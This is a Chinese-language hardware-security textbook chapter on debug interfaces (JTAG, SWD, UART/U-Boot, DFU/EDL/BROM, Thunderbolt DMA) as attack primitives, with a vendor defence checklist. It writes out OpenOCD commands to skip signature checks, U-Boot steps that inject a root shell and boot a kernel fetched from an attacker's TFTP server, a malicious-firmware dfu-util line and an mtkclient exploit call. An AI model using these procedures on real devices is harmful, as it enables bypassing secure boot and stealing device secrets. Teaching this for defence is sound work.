# Ch 36 — debug 介面當攻擊原語

> **目標**：理解 JTAG、SWD、UART bootloader console、USB DFU/EDL/BROM download mode、PCIe/Thunderbolt DMA over debug 這五類硬體除錯介面如何在攻擊者手中成為攻擊原語；掌握廠商的鎖定手段（fuse 燒斷、密碼保護、ARM CoreSight authenticated debug）；能判斷目標裝置的 debug 介面暴露狀況。本章屬 Part 6 硬體攻擊，所有硬體實測均未實測，給原理、參數、公開案例與驗證思路。

---

## 為什麼 Debug 介面是攻擊原語

Debug 介面是**工程師的後門**：為了讓開發者能在裝置上暫停 CPU、讀寫記憶體、看暫存器，SoC 出廠時內建了 JTAG/SWD 等硬體除錯接口。問題在於：

1. 這些介面賦予的能力**比 OS 的 root 還要深**——直接在矽層操作
2. 介面本身**不懂 Secure Boot**——JTAG 不問你是否有權限，它只問你能不能物理接線
3. 廠商的鎖定手段（fuse 燒斷）是**不可逆的但非強制的**——量產前必須人為執行，疏失就留下後門

```
Debug 介面提供的攻擊能力層次：

  JTAG/SWD（最強）：
    → 暫停任意 CPU core
    → 讀寫任意記憶體（包括 TrustZone Secure World）
    → 修改 PC（Program Counter）跳過任意指令
    → 設定硬體斷點，觀察執行流

  UART bootloader console（中等）：
    → 與 bootloader 互動（U-Boot shell / 廠商 shell）
    → 修改 boot 環境變數（bootargs、bootcmd）
    → 載入自定義 kernel / initramfs

  USB download mode（中等）：
    → 傳入 firmware 更新包（DFU / EDL / BROM 模式）
    → 部分情況無需簽章驗證（Ch 21 T5 類型）

  PCIe / Thunderbolt DMA（強，見 Ch 35）：
    → 直接讀寫 host RAM
    → 繞過 OS 的 kernel isolation
```

---

## JTAG / SWD：最底層的硬體控制

### JTAG 基本原理

JTAG（Joint Test Action Group，IEEE 1149.1）原設計用於 PCB 測試（boundary scan），後被廣泛用作 SoC 除錯介面。

**訊號線**（4+1 線）：

```
TCK  — Test Clock（攻擊者提供時鐘）
TMS  — Test Mode Select（狀態機控制）
TDI  — Test Data In（資料輸入到 SoC）
TDO  — Test Data Out（資料從 SoC 輸出）
TRST — Test Reset（可選，非必要）
```

**JTAG 狀態機（TAP Controller）**：

```
JTAG 的 16 狀態機（TAP = Test Access Port）：

                    TMS=1
  ┌─────────────────────────────────────────────────────────┐
  │                                                         ▼
  Reset ──TMS=0──→ Run-Test/Idle
                        │
               TMS=1    ▼
         ┌──────── Select-DR-Scan ──────TMS=1──→ Select-IR-Scan
         │               │                              │
         ▼           TMS=0                          TMS=0
      Capture-DR     Capture-DR                  Capture-IR
         │               │                              │
     TMS=0           Shift-DR (資料移位)           Shift-IR (指令移位)
         ▼               │                              │
      Shift-DR       Exit1-DR                       Exit1-IR
                         │                              │
                     Update-DR                      Update-IR
                         │
                   → Run-Test/Idle（繼續操作）

  核心操作：
    → Shift-IR：送入指令（IDCODE/BYPASS/EXTEST/SAMPLE/PRELOAD）
    → Shift-DR：根據指令讀寫對應的資料暫存器
```

### JTAG 作為攻擊原語

在軟體層無法突破時，JTAG 提供的能力包括：

**1. 暫停 CPU 執行**

```
OpenOCD 指令（未實測，硬體概念）：

# 連接目標（以 Raspberry Pi 為 JTAG adapter 為例）
openocd -f interface/raspberrypi-native.cfg -f target/stm32f4x.cfg

# 進入 telnet 控制
telnet localhost 4444

# OpenOCD 命令
halt          # 暫停 CPU
reg           # 顯示所有暫存器
step          # 單步執行
resume        # 繼續執行
reset halt    # 重置並立即停在 reset vector

# 讀寫記憶體
mdw 0x08000000 32   # 讀 0x08000000 開始的 32 個 word（flash 內容）
mww 0x20000000 0x41414141  # 在 SRAM 0x20000000 寫入 0x41414141

# 修改 PC（跳到攻擊者指定位址）
reg pc 0x20000100   # 讓 CPU 從 SRAM 0x20000100 開始執行
step
```

**2. 跳過簽章驗證的具體操作**

```
場景：目標 MCU 跑 bootloader，驗簽失敗時呼叫 rejection_handler()
JTAG 繞過思路：

步驟 1：連接 JTAG，halt CPU，不讓 bootloader 自動執行
步驟 2：用 disassemble 找到驗簽後的條件跳轉
          mdw 0x08001200 4   # 讀驗簽函式附近的指令

步驟 3：識別關鍵跳轉（ARM Thumb-2 範例）：
  0x08001250: CBZ r0, #0x0800125c  ; r0=0（驗簽成功）→ 繼續
  0x08001252: B   rejection_handler ; r0≠0（失敗）→ 拒絕

步驟 4：修改 r0 暫存器繞過跳轉：
  reg r0 0x00000000   # 強制讓 r0=0，無論驗簽結果

步驟 5：讓執行繼續
  step      # 執行 CBZ，r0=0 → 跳到 0x0800125c（成功路徑）
  resume    # 繼續執行

效果：bootloader 相信驗簽通過，載入攻擊者提供的 image
```

**3. 讀取 TrustZone Secure World 記憶體（ARM）**

```
ARM TrustZone 與 JTAG 的交互：

  正常 Non-Secure（NS）存取 TrustZone：
    → 被 TrustZone address space controller 阻擋，bus fault

  JTAG 繞過 TrustZone：
    → Debug ROM 的 DBGAUTHSTATUS 控制 debug 能否跨越安全邊界
    → 若 SID（Secure Invasive Debug）未鎖定：
       JTAG 可以設定 DBGDSCR[SPIDEN] bit
       → 讓 debugger 進入 Secure World
       → 讀取 TrustZone 記憶體（包含 TEE 金鑰、secure storage）

    DBGAUTHSTATUS 暫存器（CP14，c0,c1,0）：
      NSNID[5:4] = Non-Secure Non-invasive Debug
      NSID[7:6]  = Non-Secure Invasive Debug（讀寫 NS 記憶體）
      SNID[9:8]  = Secure Non-invasive Debug
      SID[11:10] = Secure Invasive Debug ← 這個允許才能看 Secure World
```

### SWD：ARM 的兩線精簡版 JTAG

SWD（Serial Wire Debug）是 ARM 設計的 JTAG 簡化版，只需要 2 條線（+GND）：

```
SWDIO — 雙向資料線
SWDCLK — 時鐘

好處：
  → 只需 2 個 GPIO（很多嵌入式裝置引出 SWD 而非完整 JTAG）
  → 與 JTAG 相同的 DAP（Debug Access Port）機制
  → 相同的攻擊能力

常用 adapter：
  → ST-Link V2（< $5，針對 STM32，也支援其他 ARM）
  → J-Link（Segger，商業，高速，廣泛支援）
  → Black Magic Probe（開源 firmware，GDB server on-adapter）
  → Raspberry Pi GPIO（SWD bit-bang）
```

---

## JTAG 鎖定與 Glitch 解鎖

### 廠商如何鎖閉 JTAG

量產裝置應該燒斷 JTAG fuse，讓 debug 介面永久不可用：

| SoC / 平台 | JTAG 鎖定機制 | Fuse 名稱 |
|------------|--------------|----------|
| STM32 | RDP（Read Protection）Level 2 | FLASH_OPTCR.RDP |
| NXP i.MX | HAB（High Assurance Boot）配合 eFuse | 0x460[7:4] = SEC_CONFIG |
| Qualcomm | JTAG disable via QFPROM | FEATURE_CONFIG fuse |
| MTK | JTAG_DISABLE efuse | DA eFuse bit |
| Broadcom BCM | OTP JTAG lock | JTAG_JTAG_OTP |
| AMD PSP | JTAG gating via PSP fuse | PSP_JTAG_LOCK |

**燒 fuse 後的行為**：

```
STM32 RDP Level 2 行為：
  → 完全停用 debugger 存取
  → SRAM / Flash 無法從 debug port 讀取
  → 此狀態不可逆（RDP Level 2 是最高等級，無法降回）
  → 嘗試 JTAG 連接：IDCODE 讀出 0x0（或全 1），無法 halt

MTK JTAG 鎖定後：
  → OpenOCD 無法識別 TAP
  → CPU IDCODE 讀出全 0xFF（無效值）
  → 嘗試進入 Test Mode 無回應
```

### Glitch 解鎖 JTAG Fuse（EMFI / 電壓 glitch）

Ch 34 介紹了故障注入。其中 EMFI（電磁故障注入）對 JTAG fuse 的特別應用：

```
攻擊概念（未實測）：

目標：讀取 STM32 RDP Level 2 的 fuse 值時，用電壓 glitch
      讓 SoC 誤判 RDP 等級

STM32 BootROM 啟動時序：
  t=0ms   BootROM 啟動
  t=1ms   讀取 FLASH_OPTCR.RDP（從 OTP）
  t=1.5ms 根據 RDP 值決定是否允許 debugger
            ↑
            ← 攻擊視窗在這裡

電壓 glitch 參數（Ledger Donjon 2019 展示的 Trezor 案例）：
  offset: ~1500 µs（從 reset 到 fuse 讀取）
  width:  ~5–20 ns（短脈衝）
  voltage: 降到 ~0V

成功後：BootROM 誤判 RDP = Level 0 或 Level 1
         → JTAG 存取被允許
         → 可以讀 SRAM / 設定 breakpoint

EMFI 替代電壓 glitch 的優點：
  → 不需要直接接觸 VCC 電源線
  → 探頭靠近 OTP 讀取電路的 die 位置
  → 可以在裝置電路板未拆下時操作（若知道 IC 的 die 佈局）
```

---

## UART Bootloader Console

### 為什麼 UART 是最常見入口

UART（Universal Asynchronous Receiver-Transmitter）console 是嵌入式裝置最普遍的除錯輸出介面。大部分裝置在開機時會輸出 bootloader log，這個 log 本身就是攻擊者的情報：

```
典型 bootloader UART log 洩露的資訊：
  → SoC 型號和版本（MTK MT7622、BCM4908...）
  → Bootloader 版本（U-Boot 2021.01、Uboot v1.1.4...）
  → Flash 分區表（mtdparts=...）
  → Kernel 命令行（bootargs=...）
  → Secure Boot 狀態（[SEC] SBC enabled / disabled）
  → Memory map（DDR: 512MB @ 0x80000000）
  → 網路介面 MAC（eth0 mac: xx:xx:xx:xx:xx:xx）
```

### 尋找 UART 測試點

```
電路板測試點識別方法（未實測，概念）：

視覺掃描：
  → 尋找標有 TX/RX/GND/VCC 的 4 孔排針（常見於路由器、機上盒）
  → 尋找標有 J1/J2/J3 的 debug header
  → 查 PCB silkscreen 的字樣（TX、RX、DEBUG、CONSOLE、UART）

電壓探測（用萬用表）：
  → GND 找到後，逐個測試 TP（測試點）對 GND 的電壓
  → 有固定電位（3.3V 或 1.8V）的點可能是 VCC
  → 在開機瞬間快速跳動（波動）的點可能是 TX

邏輯分析儀掃描（未實測）：
  → 把邏輯分析儀的探頭掃描可疑的測試點
  → 開機時觀察是否有數位訊號（0/1 切換）
  → 用 Pulseview / Sigrok 的 UART 解碼器嘗試不同波特率
  → 常見波特率：115200、57600、38400、19200、9600

Boundary Scan（JTAG EXTEST）：
  → 若已有 JTAG 連接，用 JTAG boundary scan 可以掃描所有 IO 引腳
  → 識別哪些引腳在開機時有 UART 訊號特徵
```

### U-Boot Console 利用（呼應 Ch 21 T2）

Ch 21 T2 已介紹 Amazon Echo 的 UART 案例，這裡深挖 U-Boot console 的攻擊細節：

```bash
# UART 連接後，開機時按住空白鍵或 Enter 中斷 autoboot
# U-Boot 顯示：
# Hit any key to stop autoboot:  0

# --- 進入 U-Boot shell 後的情報蒐集 ---

# 查看所有環境變數
printenv

# 典型重要變數：
# bootargs=console=ttyS0,115200 root=/dev/mmcblk0p2 rw
# bootcmd=mmc dev 0; mmc read 0x81000000 0x800 0x4000; bootm 0x81000000
# ethaddr=xx:xx:xx:xx:xx:xx
# ipaddr=192.168.1.1
# serverip=192.168.1.254（tftp server）

# 查看記憶體映射
bdinfo

# 查看 flash 分區
mtdparts

# --- 基本攻擊：修改 bootargs 注入 init=/bin/sh ---
setenv bootargs "console=ttyS0,115200 root=/dev/mmcblk0p2 rw init=/bin/sh"
saveenv   # 儲存（如果不想要持久化就不要 saveenv）
boot

# --- 進階：透過 TFTP 載入攻擊者的 kernel / initramfs ---
setenv ipaddr 192.168.1.100       # 目標裝置 IP
setenv serverip 192.168.1.200     # 攻擊者的 TFTP server
tftpboot 0x81000000 uImage        # 下載攻擊者的 kernel
tftpboot 0x82000000 initramfs.cpio.gz
setenv bootargs "console=ttyS0,115200 root=/dev/ram0 rw"
bootm 0x81000000 0x82000000       # 啟動

# --- 讀取 flash 內容（不需要 SPI programmer）---
# 若 NAND flash
nand read 0x81000000 0x0 0x100000  # 讀 1MB 到 DRAM
md.b 0x81000000 0x100              # 顯示前 256 bytes

# 若 SPI NOR，有些 U-Boot 有 sf（SPI Flash）命令
sf probe
sf read 0x81000000 0x0 0x800000    # 讀整個 8MB flash
```

**廠商 shell 的情況**：某些廠商（TP-Link、ASUS、D-Link 舊版路由器）有自製的 bootloader shell，功能比 U-Boot 少，但可能提供 `tftp load` 或 `flash write` 命令，研究方式相同。

---

## USB DFU / EDL / BROM Download Mode

### 三種「低階 USB 存取模式」

這三種模式的共同點：在 bootloader（甚至 BootROM）層提供 USB 介面，讓廠商工具傳入 firmware。攻擊者的問題是：這個 USB 介面需要多少驗簽？

```
┌──────────────────┬─────────────────────────────────────┬─────────────────────┐
│ 模式             │ 觸發方式                            │ 典型用途            │
├──────────────────┼─────────────────────────────────────┼─────────────────────┤
│ USB DFU          │ 進入 DFU mode（設備特定按鈕組合）  │ STM32/嵌入式 MCU    │
│ (Device Firmware │ bcdDFU version / idProduct 可識別  │ 韌體更新            │
│  Upgrade)        │                                     │                     │
├──────────────────┼─────────────────────────────────────┼─────────────────────┤
│ Qualcomm EDL     │ MTP 模式按 Vol+/Vol- 組合          │ Qualcomm SoC 手機   │
│ (Emergency       │ 短接 EDL 測試點                    │ 廠商工具 QPST/QFIL  │
│  Download Mode)  │                                     │                     │
├──────────────────┼─────────────────────────────────────┼─────────────────────┤
│ MTK BROM Mode    │ Vol- 按住開機 / 短接 BROM 測試點   │ MTK SoC 裝置        │
│ (Boot ROM mode)  │ mtkclient 可偵測                   │ SP Flash Tool       │
└──────────────────┴─────────────────────────────────────┴─────────────────────┘
```

### USB DFU 攻擊面

DFU（Device Firmware Upgrade）是 USB 標準（USB.org DFU spec），但各廠商實作差異極大：

```c
// DFU 協定的核心操作（USB control transfers）
DFU_DETACH  (0x00)  // 請求設備進入 DFU 模式
DFU_DNLOAD  (0x01)  // 傳入韌體 block（攻擊者送惡意 firmware）
DFU_UPLOAD  (0x02)  // 讀出韌體（dump 現有 firmware）
DFU_GETSTATUS (0x03) // 查詢操作狀態
DFU_CLRSTATUS (0x04)
DFU_GETSTATE  (0x05)
DFU_ABORT   (0x06)
```

**攻擊關鍵問題**：DFU_DNLOAD 送入的 data，bootloader 有沒有驗簽？

```
情況 A（無驗簽，舊版 STM32 某些配置）：
  → DFU_DNLOAD 直接把資料寫入 flash
  → 攻擊者用 dfu-util 送入任意 binary
  → dfu-util -D evil_firmware.bin -a 0

情況 B（有驗簽，例如 STM32 Secure Bootloader）：
  → DFU_DNLOAD 的 header 包含 signature
  → Bootloader 驗 RSA/ECDSA，失敗拒絕
  → 需要搭配 fault injection（Ch 34）或有洩漏的私鑰

情況 C（Bootloader 驗但 BootROM 不驗）：
  → 若能進入更底層的 ROM DFU（如 STM32 systembootloader）
  → BootROM 可能接受沒有 Secure Boot 驗簽的 binary
  → 這是 Ch 21 T5（替代路徑）的典型形式
```

### Qualcomm EDL（Emergency Download Mode）

EDL 是 Qualcomm SoC 的 BootROM 模式，透過 USB 讓廠商工具（QPST/QFIL/QSAHARA）刷入 partition image：

```
EDL 安全模型演變：

早期 EDL（pre-2016 Snapdragon）：
  → 無簽章驗證，任何人可用 firehose protocol 讀寫分區
  → 研究者可以完整 dump 手機 flash、讀取加密分區的密文

現代 EDL（Snapdragon 820+）：
  → Firehose programmer 本身需要 OEM 簽署
  → 若無廠商提供的 programmer，EDL 不接受操作
  → 但：某些廠商（小米、一加）洩漏過 EDL programmer
  → 洩漏的 programmer 讓研究者可以繞 EDL 的存取控制

EDL 測試點（未實測，概念）：
  某些 Qualcomm 手機有 EDL 測試點（在主板上）
  短接後強制進入 EDL，即使 volume 按鍵壞掉也能用
  常見位置：靠近 SoC 的細小測試點，或 USB D+/D- 的旁路點
```

### MTK BROM Mode（呼應 Ch 21）

Ch 21 T1 已詳細介紹，這裡補充 BROM 模式作為攻擊入口的機制：

```bash
# mtkclient 使用（軟體層，可在 WSL 研究工具，不需要 MTK 裝置）
pip install mtkclient

# 偵測 BROM 連線（裝置進入 BROM 模式後）
python mtk.py detect

# 讀 efuse（確認 SBC_EN 狀態）
python mtk.py efuse

# 若 SBC_EN=0：完整 eMMC dump
python mtk.py rf --filename full_dump.bin

# 若 SBC_EN=1：需要 DA（Download Agent）exploit
# mtkclient 內建部分公開的 DA exploit，對特定舊版 MTK SoC 有效
python mtk.py --exploit-da payload.bin

# 讀特定分區
python mtk.py r boot --filename boot.img
python mtk.py r lk   --filename lk.bin
```

---

## PCIe / Thunderbolt DMA over Debug

Ch 35 已詳細介紹 Thunderbolt DMA 和 PCILeech，這裡補充「作為 debug 介面」的視角：

```
PCIe / Thunderbolt 作為 debug 介面的定位：

傳統 debug（JTAG/UART）：
  → 連接到 CPU core 的 debug 介面
  → 可以 halt/step/breakpoint CPU
  → 適合韌體層除錯

PCIe/Thunderbolt DMA debug：
  → 不接觸 CPU debug 介面
  → 直接讀寫 host RAM（繞 CPU）
  → 適合 OS 層分析、記憶體取證
  → 無法 halt CPU / 設 breakpoint

兩者組合的終極攻擊：
  → 有 JTAG：直接 halt 韌體，分析 boot 前的記憶體
  → 有 PCILeech DMA：OS 起來後，在不需 JTAG 的情況下讀 kernel 記憶體

Intel 的 DCI（Direct Connect Interface）：
  → Intel 為了讓 UEFI/kernel debugger 不需要 JTAG，設計了 DCI
  → 透過 USB 3.0 DbC 介面（Debug Capability）或 Thunderbolt 提供
  → Intel 系統的 DCI_EN（fuse）未燒時，Thunderbolt 可以當 JTAG 用
  → Windows debugger（WinDbg）支援 DCI，用於 bootloader/UEFI 除錯
  → 攻擊者可以用 DCI 做到和 JTAG 類似的事（暫停 CPU、讀記憶體）
```

---

## Debug 介面總表

| 介面 | 提供的攻擊能力 | 廠商鎖定手段 | 需要的工具（未實測）|
|------|--------------|------------|-------------------|
| **JTAG** | 暫停 CPU、讀寫任意記憶體（含 TrustZone）、修改 PC、硬體 breakpoint | OTP fuse 燒斷（JTAG_DISABLE）、密碼保護（ARM DAP auth） | OpenOCD + JTAG adapter（ST-Link/J-Link），找測試點 |
| **SWD** | 同 JTAG（ARM 兩線版），較受限的 scan chain | 同 JTAG fuse，SWD DAP 認證 | ARM Cortex-M：ST-Link V2 / Black Magic Probe |
| **UART console** | Bootloader 互動、修改 bootargs、載入惡意 kernel、dump flash | bootdelay=0（無互動窗口）、CONFIG_DISABLE_CONSOLE、密碼保護 | USB-UART 轉接器（CH340/FT232），找測試點，minicom |
| **USB DFU** | 傳入韌體更新 binary（有無驗簽視廠商實作）| RSA 驗簽、Secure Boot 整合 | dfu-util，STM32 DFU mode：按 BOOT0 + Reset |
| **Qualcomm EDL** | Firehose 協定刷 partition（老版本無驗簽）| Firehose programmer 需 OEM 簽署（Snapdragon 820+） | QPST / QFIL（廠商工具）或公開 firehose loader |
| **MTK BROM** | 讀寫 eMMC（SBC=0 時）、DA exploit（SBC=1 部分 SoC） | SBC_EN fuse 燒斷、DA 驗簽（BROM 內建） | mtkclient、SP Flash Tool，BROM 模式觸發方式 |
| **PCIe / Thunderbolt DMA** | 讀寫 host RAM（OS 記憶體、kernel、credential）| IOMMU/VT-d、Thunderbolt SL2/SL3、Kernel DMA Protection | PCILeech + FPGA 硬體（ScreamerM2、ZDMA） |
| **Intel DCI** | UEFI/kernel 層的 JTAG 等效（USB DbC over Thunderbolt）| DCI_EN fuse 燒斷、BootGuard 配套鎖定 | Intel SoC DCI debugger（ITP-XDP），DCI USB DbC |

---

## 找 Debug Port：完整偵察方法

### 測試點辨識流程

```
偵察步驟 1：開蓋視覺檢查
  → 搜尋 PCB silkscreen：TX/RX/GND/VCC/DEBUG/CONSOLE/UART/J1/J2/TP1
  → 識別標準 debug header（2.54mm 排針 4-10 孔）
  → 找 SoC 附近的細小測試點（via 孔用白色圓點標記）

偵察步驟 2：資料片搜尋
  → 找到 SoC 型號（用 Ghidra/binwalk 識別韌體，或直接看 IC 封裝 marking）
  → 查 SoC datasheet 的 JTAG/SWD 引腳定義
  → 在 FCC/CE 的 PCB 照片（fcc.io 搜尋 FCC ID）對照位置

偵察步驟 3：電壓測量（未實測）
  → 找到接地（GND）：對電容/電感的外殼測
  → 所有測試點對 GND 測電壓：
    - 3.3V 固定：可能是 VCC 或 TX（空閒時 UART TX 保持高電位）
    - 0V 固定：可能是 GND 或 RX（空閒時 UART RX 也保持高電位，但已下拉）
    - 開機瞬間波動：TX 的特徵（bootlog 輸出）

偵察步驟 4：邏輯分析儀掃描（未實測）
  → 開機時同時監測所有候選測試點
  → 用 Sigrok / Pulseview 的 UART 解碼
  → 嘗試波特率：115200、57600、38400、19200、9600
  → 看哪個點有可讀的 ASCII 文字（bootlog）

偵察步驟 5：Boundary Scan（若已有 JTAG 連接）
  → openocd + jtag_boundary_scan 模組
  → 掃描所有 JTAG 連線的 SoC IO 引腳
  → 開機時記錄 TDO 上的 IO 狀態，識別有 UART 活動的引腳
```

### 韌體層確認 Debug 介面狀態

```bash
# 若已有 OS 存取（SSH 或 ADB shell）

# Linux：查 UART console 狀態
cat /proc/tty/driver/serial
dmesg | grep -i uart
ls /dev/ttyS* /dev/ttyAML* /dev/ttyMSM*

# Android：查 Qualcomm debug 相關
adb shell getprop | grep -i debug
adb shell getprop | grep -i uart
adb shell ls /dev/diag   # Qualcomm 診斷介面

# 查 JTAG / SWD 相關 kernel 配置
zcat /proc/config.gz | grep -i jtag
zcat /proc/config.gz | grep -i coresight   # ARM CoreSight debug framework

# MTK：查 efuse 狀態（若有 root）
adb shell cat /sys/kernel/efuse/sbc_en       # MTK efuse sysfs（廠商差異大）
```

---

## ARM CoreSight Authenticated Debug

現代 ARM SoC（Cortex-A55/A75+）提供了一個比「燒斷 fuse」更靈活的機制：**Authenticated Debug**。

### CoreSight 認證架構

```
ARM CoreSight 的 Debug Authentication 信號：

  DBGEN  — Invasive debug enable（可以 halt/step/讀記憶體）
  NIDEN  — Non-invasive debug enable（只能 trace，不能 halt）
  SPIDEN — Secure Privileged Invasive Debug（可存取 Secure World）
  SPNIDEN— Secure Non-invasive Debug

這四個信號來源：
  → 硬體 fuse（永久設定）
  → DAP（Debug Access Port）的 DBGAUTHSTATUS 暫存器
  → TrustZone Secure World 的軟體實作（動態控制）

廠商實作選項：
  A. 全部 fuse 燒斷（量產最安全，但無法遠端 debug）
  B. 軟體控制（TrustZone app 管理 DBGEN 等信號）
  C. 密碼保護（輸入正確密碼才允許 JTAG）
  D. RMA 回廠模式（裝置 return-to-manufacturer 時廠商解鎖）
```

### 密碼保護 JTAG 的繞過案例

部分廠商選擇用「密碼保護」而非「燒斷 fuse」，讓 RMA 時能保留 JTAG 能力：

```
密碼保護 JTAG 的典型流程：
  1. 工程師連接 JTAG，debug ROM 要求輸入 challenge
  2. challenge 是 device-unique 值（來自 fuse 或 UID）
  3. 工程師送 challenge 給廠商後端
  4. 廠商後端用私鑰計算 response
  5. 工程師送入 response，JTAG 解鎖

繞過向量：
  → 如果 response 驗證邏輯在可存取的 SRAM（而非 ROM）中：
      fault injection 讓驗證跳過
  → 如果 challenge-response 演算法是對稱的（弱演算法）：
      逆向 debug ROM，提取演算法，自行計算 response
  → 如果廠商後端被 compromise：
      取得私鑰，自行計算任意裝置的 response

2018 年案例：某廠商路由器（Broadcom BCM 系列）
  → JTAG 有密碼保護，challenge = SHA256(device_id || secret_seed)
  → secret_seed 硬編在 bootloader（可從 UART dump 的 bootloader binary 提取）
  → 研究者逆向 bootloader，找到 secret_seed，自行計算 JTAG response
  → 完整解鎖 JTAG，繞過 secure boot
```

---

## 防禦矩陣

廠商在量產前的 debug 介面鎖定清單（安全稽核用）：

```
JTAG / SWD：
  ✓ 燒 JTAG disable OTP
  ✓ 若保留 authenticated debug：確認 response 驗證在 ROM（不可更改）
  ✓ PCB 設計去除測試點，或用填膠封住
  ✓ DBGEN/SPIDEN 等信號確認在 fuse 鎖定狀態

UART：
  ✓ 量產 bootloader 設 bootdelay=0 或停用 console 輸出
  ✓ 確認 CONFIG_DISABLE_CONSOLE 或等效配置生效
  ✓ 若有廠商 shell：移除或密碼保護
  ✓ PCB 測試點移除或功能性斷開

USB download mode（DFU/EDL/BROM）：
  ✓ 確認 SBC_EN / Secure Boot fuse 燒入，讓 BROM 強制驗簽
  ✓ 測試：送無效 image，確認被拒絕（而非靜默接受）
  ✓ EDL：確認 Firehose programmer 需要 OEM 簽署
  ✓ 硬體觸發點（短接 BROM 的測試點）填膠或移除

PCIe / Thunderbolt：
  ✓ 啟用 IOMMU/VT-d，設定 IOMMU group 最小化
  ✓ Windows：啟用 Kernel DMA Protection
  ✓ DCI_EN fuse 在非開發機燒斷
  ✓ Thunderbolt SL2 或 SL3 強制（不允許 Legacy 模式）
```

---

## 踩雷

1. **UART TX/RX 方向容易接反**：UART TX 是「發送端」，要接到對方的 RX。目標裝置的 TX 接攻擊者 USB-UART 的 RX，反之亦然。接反不會損壞硬體，但什麼都看不到。

2. **3.3V UART 接到 5V 的 USB-UART 轉接器會燒晶片**：大部分現代嵌入式裝置是 3.3V 邏輯。FT232HL 和 CH340G 有 3.3V 模式，要確認跳線設定在 3.3V，不要用 5V 模式接 3.3V 裝置的 UART。

3. **bootdelay=0 不一定無法中斷**：部分 U-Boot 的 `CONFIG_ZERO_BOOTDELAY_CHECK` 設定在 bootdelay=0 時仍然在按鍵時進入 shell，只是 window 在 reset 後前幾毫秒。需要在 reset 同時狂按按鍵（有時候有效）。

4. **JTAG IDCODE 讀出 0x00000000 或 0xFFFFFFFF 不代表完全沒有 JTAG**：可能是 adapter 接線有問題（TCK/TMS/TDI/TDO 接錯）、電壓不匹配（SoC 用 1.8V IO 但 adapter 用 3.3V）、或 JTAG 需要先解 reset（TRST 未接好）。逐一排除再判斷是否 fuse 燒斷。

5. **MTK BROM 模式的觸發方式因型號而異**：MT6739 和 MT6765 的 BROM 觸發方式不同，部分型號需要短接 PCB 上的特定測試點（不是按住音量鍵）。mtkclient 的 BROM detection 超時後會顯示「device not detected」，不代表不支援，可能只是觸發方式錯。

6. **Authenticated debug 不等於「有密碼就安全」**：如果 challenge-response 演算法在 bootloader 而非 ROM 中實作，攻擊者可以先用其他手段（UART/BROM）取得 bootloader，逆向算法後再解 JTAG。密碼保護要有效，驗證邏輯必須在攻擊者無法讀取的位置（ROM 或 Secure World）。

7. **在 SWD debug session 中重置目標裝置可能讓 debugger 失去連線**：OpenOCD 有時不能正確追蹤 reset vector，需要用 `reset halt` 而非直接 `reset`，才能在 reset 後立刻停住 CPU 並維持 debug 連線。

---

## 進階延伸

- **Cortex-M 的 SWD Protocol 深入理解**：ARM 的「ADIv5 Architecture Specification」（免費下載）詳細描述 SWD/JTAG-DP 的暫存器和操作序列。理解 AP（Access Port）和 DP（Debug Port）的分層架構，是從「能連上 target」到「能穩定讀寫任意記憶體」的必修課。特別關注 MEM-AP 的 CSW、TAR、DRW 暫存器序列。

- **OpenOCD 的 TCL 腳本化**：OpenOCD 用 TCL 作為腳本語言，可以自動化一整套「連接 → halt → 讀 flash → patch → resume」的流程。研究者可以用 TCL 腳本把 JTAG 攻擊自動化，包括 parameter sweep（類似 Ch 34 的 glitch 掃描邏輯）。

- **IC 晶片的測試模式（Test Mode）**：除了 JTAG，許多 SoC 還有廠商私有的「Test Mode」，透過特定 GPIO 組合或 UART 命令進入，提供 DFT（Design for Testability）功能，包括 memory BIST、scan chain、die temperature 讀取等。這些 test mode 有時在量產韌體中沒有被停用，是額外的攻擊面。IDA Pro / Ghidra 中搜索「test mode」字串和對應的 GPIO 操作，可以找到觸發條件。

---

## 本章重點

- JTAG/SWD 提供矽層的最深控制（halt CPU、讀任意記憶體、改 PC），是所有 debug 介面中能力最強的，廠商用 OTP fuse 鎖定
- UART bootloader console 是最常見的低成本攻擊入口，修改 bootargs 注入 `init=/bin/sh` 是標準手法；防禦靠 bootdelay=0 和 disable console
- USB DFU / Qualcomm EDL / MTK BROM 是低階 USB 存取模式，安全性取決於 BootROM 是否驗簽傳入的 image
- PCIe / Thunderbolt DMA 能力參見 Ch 35，作為 debug 介面的定位是「OS 層 RAM 讀取」而非「CPU halt」
- ARM CoreSight authenticated debug 是比 fuse 燒斷更靈活的機制，但 challenge-response 的安全性取決於驗證邏輯在哪裡執行
- 找 debug port 是韌體安全研究的基礎技能：視覺掃描 → 電壓測量 → 邏輯分析儀 → boundary scan
- 本章所有硬體實測均未實測

---

## 自我檢核

- [ ] 能說出 JTAG 的四條訊號線（TCK/TMS/TDI/TDO）各自的功能，以及 TAP 狀態機的兩條主要路徑（DR scan / IR scan）
- [ ] 能解釋用 JTAG 繞過驗簽的具體操作（halt → 找條件跳轉 → 修改暫存器 → resume）
- [ ] 知道 ARM TrustZone 的 DBGAUTHSTATUS 暫存器中 SID bit 的含義，以及它如何讓 JTAG 能讀 Secure World
- [ ] 能解釋 U-Boot console 攻擊的完整步驟（接 UART → 中斷 autoboot → setenv bootargs → 載入惡意 kernel）
- [ ] 能說出 USB DFU / Qualcomm EDL / MTK BROM 三種模式的主要差異（觸發方式、驗簽要求、適用平台）
- [ ] 能畫出「debug 介面 vs 攻擊能力 vs 廠商鎖定手段」的三欄對應（對應本章總表）
- [ ] 理解 ARM CoreSight authenticated debug 相對於 fuse 燒斷的優點和弱點

---

## 延伸閱讀

1. **"Hacking the Zynq Boot Process" — Dmitry Janushkevich（Hardwear.io 2019）**
   讀哪裡：Hardwear.io 議題投影片（hardwear.io/nl-2019/）和 YouTube 錄影
   學什麼：Xilinx Zynq SoC 的 JTAG + Secure Boot 繞過完整案例：JTAG fuse 的評估、SWD 攻擊流程、如何在有 authenticated debug 的平台上找到軟體驗證邏輯的弱點
   關聯：直接對應本章 JTAG 攻擊和 authenticated debug 小節，是「JTAG 密碼保護被繞過」的具體教學案例

2. **OpenOCD 官方文件與 ARM ADIv5 Specification**
   讀哪裡：openocd.org 的 User's Guide（openocd.org/doc/html/）；ADIv5 spec 在 developer.arm.com 免費下載（搜尋「IHI0031」）
   學什麼：OpenOCD 的 TCL 腳本化控制、target 設定語法（-f 參數）；ADIv5 的 DP/AP 分層、MEM-AP 的暫存器操作序列——理解這兩份文件才能從「跑範例」進化到「自訂腳本自動化攻擊」
   關聯：本章 JTAG/SWD 小節的軟體工具深入，以及 Ch 34 ChipWhisperer 腳本化思路在 JTAG 上的對應

3. **"Defeating Qualcomm SecureBoot through EDL" — Binaryconflict Research（2023）**
